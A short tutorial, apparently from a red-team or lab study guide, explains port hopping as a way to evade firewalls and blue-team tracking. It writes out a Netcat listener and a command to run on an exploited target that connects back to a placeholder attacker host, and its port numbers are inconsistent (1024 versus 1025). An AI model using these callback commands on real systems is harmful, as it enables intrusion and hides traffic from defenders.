# Evasion using port hopping

Port hopping is a technique where an application hops from one port to another till it can establish and maintain a 
connection. In other words, the application might try different ports till it can successfully establish a connection. 
Some "legitimate" applications use this technique to evade firewalls.

There is another type of port hopping where the application establishes the connection on one port and starts 
transmitting some data; after a while, it establishes a new connection on (hops to) a different port and resumes 
sending more data. The purpose is to make it more difficult for the blue team to detect and track all the exchanged 
traffic.

Set up a listener on the attack machine:

    $ ncat -lvnp 1025

Then exploit a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some 
code with a command. As command use Netcat to connect to the target port using the command 
`ncat IP_ADDRESS PORT_NUMBER`. For example, run `ncat ATTACK_IP 1024` to connect to the attacker machine at TCP port 
`1025`. Then try another port: Change the listener and the command to match.

